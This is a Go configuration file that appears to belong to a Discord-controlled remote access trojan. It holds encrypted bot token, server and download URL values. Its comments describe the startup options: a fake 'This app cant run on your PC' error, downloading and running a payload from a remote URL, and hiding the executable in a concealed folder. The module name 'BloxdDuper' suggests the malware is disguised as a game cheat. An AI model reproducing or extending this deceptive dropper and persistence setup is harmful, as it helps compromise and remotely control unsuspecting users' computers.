package config

// STARTUP MODE:
// 0: does not do anything fancy
// 1: triggers the "This app cant run on your PC" notification
// 2: downloads and runs the executable in a zip folder from the ModuleUrl, the ModuleName needs to match the executables name
// 3: delets the old executable and moves it to the hidden folder

const (
	BotToken   string = "d3lIR98Rbx+MEzvenRih1qmXbOwzBYKMPZzbElZ1NYZJ6oqYWkoma3b5AQ5UdngdOmsbHugrivOp0jKKwhn+L5EslRVZhVLlwbBSFErxAYg="
	ServerId   string = "Uip+pYj+WVcZhJUWL4MWkBamJJh4J5csj/VAbAA55M0="
	CategoryId string = "5XCFAB8E6Qvtar+bXn6SJgyDDZa73lKmvEQx5PHCg5E="

	StartupMode int    = 0
	ModuleUrl   string = "D2oJVaBzzBPSOnBQJDpbjfQYOp1Eex+LmzaoZ/aCJs8nvfo65+lv0Q886XixnE3xwtPoMYVcSOVpnP+tmCQcW4iP5TN8QFsTl/0LAj642kt82xBb5Jgy6OTEduG4aWzkfP3IqWwMOGTdatqs84MttNfpgUy/qvZavc8RwkRIrarQePDnvezLqOjq3jWud9pcFnLBVySAw9zqLWe6vES8Nc1LRHGtbrQ2A2yL6iL/+KZCiuxrjStD7LsAOg07Kbid"
	ModuleName  string = "BloxdDuper"

	Prefix string = "."
)
